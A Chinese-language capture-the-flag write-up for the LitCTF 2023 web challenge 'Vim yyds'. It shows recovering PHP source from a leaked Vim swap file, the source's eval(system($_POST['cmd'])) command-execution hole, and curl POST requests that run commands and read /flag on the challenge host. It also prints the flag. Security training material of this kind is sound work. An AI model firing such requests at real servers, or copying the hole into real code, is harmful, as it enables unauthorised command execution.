# 📝 [LitCTF 2023] Vim yyds

---
题目地址：https://www.nssctf.cn/problem/3866    

<img width="453" height="222" alt="image" src="https://github.com/user-attachments/assets/ec1f3642-1d05-4a27-9d8f-1f653ce39bbb" />  

## 一、题目信息

| 项目 | 内容 |
|------|------|
| 题目名称 | Vim yyds |
| 考点 | VIM 临时文件泄露、源码审计、RCE（远程命令执行） |
| Flag | `NSSCTF{450895af-34a0-464b-8062-dc0dfe41a6b9}` |

---

## 二、漏洞原理与利用链

### 1. VIM 交换文件泄露（信息收集）

**原理**：
- VIM 编辑器在编辑文件时，会在**同目录下**生成一个隐藏的临时交换文件（swap file）
- 正常退出时，该文件会被自动删除
- 如果 VIM 进程被强制终止（如直接关闭终端、服务器断电等），`.swp` 文件会**残留在服务器上**
- 攻击者可以通过访问 `/.index.php.swp` 下载该文件

**本题中的利用**：
```
http://node4.anna.nssctf.cn:25197/.index.php.swp
```
直接访问该路径即可下载 `.index.php.swp` 文件。

---

### 2. 恢复源码（信息提取）

**恢复方法**：
- 在 Linux 环境中使用 `vim -r .index.php.swp` 恢复
- 或在 Windows 中用记事本打开，从乱码中提取 `<?php ... ?>` 代码段
- <img width="851" height="165" alt="image" src="https://github.com/user-attachments/assets/6621e7b1-6e18-4d23-8fc2-5156aff9eb77" />


**恢复出的源码**：
```php
<?php
error_reporting(0);
$password = "Give_Me_Your_Flag";
echo "<p>can can need Vim </p>";

if ($_POST['password'] === base64_encode($password)) {
    echo "<p>Oh You got my password!</p>";
    eval(system($_POST['cmd']));
}
?>
```
---

### 3. 代码审计（核心漏洞）

| 代码关键点 | 分析 |
|-----------|------|
| `$password = "Give_Me_Your_Flag"` | 硬编码密码，直接泄露 |
| `$_POST['password'] === base64_encode($password)` | 需要 POST 提交 Base64 编码后的密码 |
| `eval(system($_POST['cmd']))` | 存在 RCE 漏洞，可直接执行系统命令 |

**计算 Base64 密码**：
```
Give_Me_Your_Flag → R2l2ZV9NZV9Zb3VyX0ZsYWc=
```
```php
base64_encode("Give_Me_Your_Flag") = R2l2ZV9NZV9Zb3VyX0ZsYWc=
```

<img width="864" height="292" alt="image" src="https://github.com/user-attachments/assets/bfc1b16f-7ba8-4a27-85c5-c9ce9d17b786" />

---

### 4. RCE 利用（获取 Flag）

**命令执行链**：
1. POST 提交 `password=R2l2ZV9NZV9Zb3VyX0ZsYWc=`
2. 同时提交 `cmd=ls` 查看目录
使用 `curl` 构造 POST 请求：
```bash
curl -X POST "<URL>" -d "password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=ls"
```
3. 发现根目录下有 `flag` 文件，读取：
```bash
curl -X POST "<URL>" -d "password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat%20/flag"
```
<img width="691" height="276" alt="image" src="https://github.com/user-attachments/assets/ab46d9e0-db24-4448-b85e-99ebd70e839c" />  

4. 执行 `cat /flag` 获取 Flag
<img width="692" height="54" alt="image" src="https://github.com/user-attachments/assets/701fe0be-bc6d-41b2-9b15-986644be32fb" />  


**最终 Payload**：
```bash
curl -X POST "http://node4.anna.nssctf.cn:25197/" \
  -d "password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat%20/flag"
```

## Flag
```
NSSCTF{450895af-34a0-464b-8062-dc0dfe41a6b9}
```
<img width="692" height="51" alt="image" src="https://github.com/user-attachments/assets/a000019b-4c30-4195-b1f3-0783cd5b3b3b" />

---

## 三、完整攻击流程图

```
┌─────────────────┐
│  访问靶机首页    │
└────────┬────────┘
         ▼
┌─────────────────┐
│ 发现 VIM 泄露    │  ← 访问 /.index.php.swp
└────────┬────────┘
         ▼
┌─────────────────┐
│ 恢复 index.php   │  ← vim -r 或记事本提取
└────────┬────────┘
         ▼
┌─────────────────┐
│ 代码审计         │  ← 发现硬编码密码 + RCE
└────────┬────────┘
         ▼
┌─────────────────┐
│ 构造 POST 请求   │  ← password=Base64密码 & cmd=ls
└────────┬────────┘
         ▼
┌─────────────────┐
│ 发现 /flag 文件  │
└────────┬────────┘
         ▼
┌─────────────────┐
│ cat /flag 获取   │  ← NSSCTF{...}
└─────────────────┘
```

---

## 四、知识点考点总结

### 🔹 考点 1：VIM 临时文件泄露
- VIM 交换文件格式：`.原文件名.swp`
- 访问路径示例：`/.index.php.swp`
- 恢复命令：`vim -r .index.php.swp`
- **防护建议**：关闭 VIM 的 swap 文件功能，或确保编辑后正常退出

### 🔹 考点 2：源码审计
- 硬编码密码泄露（`Give_Me_Your_Flag`）
- Base64 编码绕过（`base64_encode()`）
- 弱类型/逻辑漏洞识别

### 🔹 考点 3：RCE（远程命令执行）
- `eval(system($_POST['cmd']))` 的危险性
- 通过 POST 参数直接执行系统命令
- 常用命令：`ls`、`cat`、`find`、`pwd`、`whoami`

### 🔹 考点 4：信息收集
- 目录扫描（`dirsearch`）
- 敏感文件探测（`.swp`、`.bak`、`.git` 等）
- 根目录文件枚举
---

## 六、常见问题 Q&A

| 问题 | 解答 |
|------|------|
| 为什么访问 `.swp` 会下载？ | 服务器没有禁止访问隐藏文件，且该文件未被删除 |
| 为什么用记事本打开是乱码？ | `.swp` 是二进制文件，包含 VIM 的元数据，但源码明文夹杂其中 |
| 为什么 `cat flag` 一开始没输出？ | 因为 `flag` 在根目录 `/`，不在当前 Web 目录 |
| `eval(system())` 为什么可以执行命令？ | `system()` 执行命令并输出结果，`eval()` 只是调用了它 |
